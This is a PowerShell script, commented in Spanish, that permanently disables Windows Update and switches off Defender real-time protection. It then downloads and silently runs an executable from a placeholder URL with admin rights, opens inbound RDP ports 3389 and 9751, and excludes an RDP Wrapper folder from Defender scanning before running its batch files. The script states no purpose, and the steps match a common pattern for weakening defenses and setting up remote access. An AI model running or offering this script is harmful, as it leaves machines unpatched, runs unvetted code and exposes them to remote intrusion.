# Función para deshabilitar Windows Update completamente
function Disable-WindowsUpdate {
    Write-Host "Deshabilitando Windows Update..."
    
    # Detiene el servicio Windows Update
    Stop-Service -Name wuauserv -Force -ErrorAction SilentlyContinue
    
    # Cambia el tipo de inicio a 'Deshabilitado'
    Set-Service -Name wuauserv -StartupType Disabled
    
    # Configura la recuperación para que no intente reiniciarse
    $regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\wuauserv"
    Set-ItemProperty -Path $regPath -Name "FailureActions" -Value ([byte[]](60,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0))
    
    Write-Host "Windows Update ha sido deshabilitado completamente."
}

# Llamar a la función para deshabilitar Windows Update
Disable-WindowsUpdate

# Desactivar antivirus temporalmente
Set-MpPreference -DisableRealtimeMonitoring $true

# Descargar y ejecutar un archivo desde GitHub
$exeUrl = "URL_DEL_ARCHIVO"
$tempExePath = "$env:TEMP\archivo.exe"
Invoke-WebRequest -Uri $exeUrl -OutFile $tempExePath
Start-Process -FilePath $tempExePath -ArgumentList "/S" -Verb RunAs -Wait
Remove-Item -Path $tempExePath -Force

# Configurar reglas de Firewall
New-NetFirewallRule -DisplayName "rdp1" -Direction Inbound -Protocol TCP -LocalPort 3389 -Action Allow
New-NetFirewallRule -DisplayName "rdp2" -Direction Inbound -Protocol TCP -LocalPort 9751 -Action Allow

# Excluir carpeta en Windows Defender
Add-MpPreference -ExclusionPath "C:\Program Files\RDP Wrapper"

# Ejecutar archivos BAT
$batFiles = @(
    "C:\Program Files\RDP Wrapper\install.bat",
    "C:\Program Files\RDP Wrapper\update.bat",
    "C:\Program Files\RDP Wrapper\enable.bat"
)
foreach ($batFile in $batFiles) {
    Start-Process -FilePath $batFile -Wait -Verb RunAs
}

# Reactivar Antivirus
Set-MpPreference -DisableRealtimeMonitoring $false

Write-Host "Proceso completado exitosamente."
